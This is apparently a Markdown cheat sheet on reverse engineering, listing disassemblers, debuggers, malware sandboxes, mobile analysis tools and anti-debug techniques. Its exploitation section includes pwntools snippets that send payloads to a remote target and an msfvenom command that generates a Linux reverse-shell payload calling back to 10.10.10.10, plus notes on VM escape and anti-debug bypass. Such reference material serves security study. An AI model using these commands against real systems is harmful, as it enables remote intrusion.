# Reverse Engineering Bible

## Static Analysis

### Disassemblers
- **IDA Pro** - Industry standard (Windows/Linux/Mac)
- **Ghidra** - NSA tool, free, excellent
- **Binary Ninja** - Modern, paid
- **Capstone** - Disassembly framework

### Decompilers
- **Ghidra** - Decompiler built-in
- **IDA Pro Hex-Rays** - Best commercial decompiler
- **RetDec** - Open-source decompiler
- **Snowman** - Free decompiler

### Tools
- **Radare2** - CLI framework
  - `r2 binary` - Enter r2
  - `aaa` - Analyze
  - `afl` - List functions
  - `pdf` - Disassemble function
- **objdump** - Simple disassembly
- **readelf** - ELF analysis
- **strings** - Extract strings
- **file** - Identify file type

### Analysis Workflow
1. Identify file type (`file`, `exiftool`)
2. Check for packing (`upx -d`, `detect_it_simple`)
3. Strings analysis (`strings -n 8`)
4. Import/exports (`objdump -p`, `dumpbin /exports`)
5. Find entry point
6. Identify key functions
7. Disassemble/decompile critical code

## Dynamic Analysis

### Debuggers
- **GDB** - Linux CLI debugger
  - `gdb ./binary`
  - `run` - Start
  - `break func` - Set breakpoint
  - `ni` - Next instruction
  - `si` - Step into
  - `x/s $rip` - Examine memory
  - `info registers`

- **x64dbg** - Windows GUI debugger
- **WinDbg** - Windows kernel debugger
- **OllyDbg** - Old but useful for Windows
- **Immunity Debugger** - Immunity canvas

### Debugging Techniques
- Breakpoints (hardware/software/memory)
- Memory inspection
- Register state
- Call stack
- Thread analysis

### VM Escapes
- Use isolated VM for malware
- Detect VM (`systeminfo`, `ls /proc`)
- Escape via shared folders, clipboard, virtual networks

## Binary Exploitation

### Format Exploits
- **ELF** - Linux executables
- **PE** - Windows executables
- **Mach-O** - macOS executables

### Memory Corruption
- Buffer overflows
- Use-after-free
- Format string bugs
- Integer overflows
- Race conditions

### Exploit Development
- **pwntools** - Python exploitation framework
  - `from pwn import *`
  - `r = remote('target', port)`
  - `r.sendline(payload)`
- **ROP Gadgets** - Find ROP chains
  - `ropper -f binary`
  - `ROPgadget --binary binary`
- **one_gadget** - Find one-shot RCE
- **libc database** - Find libc versions

### Shellcode
- **msfvenom** - Generate shellcode
  - `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw`
- **unicorn** - Shellcode framework
- **shellcode_builder** - Custom shellcodes

## Malware Analysis

### Signatures
- **YARA** - Pattern matching
  - `yara rules.yar malware.exe`
- **strings** - Static strings
- **pescanner** - PE analysis

### Sandbox
- **Any.run** - Interactive sandbox
- **Hybrid Analysis** - Free sandbox
- **Cuckoo Sandbox** - Open-source
- **CAPEv2** - Advanced malware sandbox

### Unpacking
- **UPX** - `upx -d malware.exe`
- **Unpac.me** - Automated unpacking
- Manual unpacking with debugger

### Behavior Analysis
- **Procmon** - Process monitor
- **API Monitor** - API calls
- **Inetsim** - Fake internet
- **Fakenet** - Network simulation

## Code Analysis

### Decompilation
- Ghidra: Decompile (F5)
- Hex-Rays: Decompile
- RetDec: Web service

### Binary Patching
- **Binary Ninja** - Patch with ease
- **IDA** - Edit bytes
- **Radare2** - `r2 -w binary`

### Obfuscation
- **Obfuscator-LLVM** - Compile-time obfuscation
- **VMProtect** - Commercial virtualization
- **Themida** - Commercial packing

## Mobile Analysis

### Android
- **jadx** - Java decompiler
- **apktool** - APK disassembly
- **Frida** - Dynamic instrumentation
- **Drozer** - Security framework
- **MobSF** - Mobile security framework

### iOS
- **Ghidra** - iOS binary analysis
- **Radare2** - CLI analysis
- **class-dump** - Objective-C headers
- **frida-ios-dump** - Decrypt App Store apps

## Anti-Debug

### Detection
- IsDebuggerPresent
- CheckRemoteDebuggerPresent
- Timing checks (RDTSC)
- Code checks (int 2d, 0xCC)
- Parent process check

### Bypass
- **ScyllaHide** - Anti-anti-debug plugin
- **TitanHide** - Kernel-mode anti-debug
- Manual patching

## Tools
- Ghidra
- IDA Pro
- Binary Ninja
- Radare2
- GDB
- x64dbg
- WinDbg
- pwntools
- ROPgadget
- YARA
- Cuckoo Sandbox
- CAPEv2
- MobSF
- Frida
- Apktool
- jadx

## References
- Ghidra Documentation
- Radare2 Book
- pwntools documentation
- Malware Analysis Tutorial (RPISEC)
- HackTricks - Reverse Engineering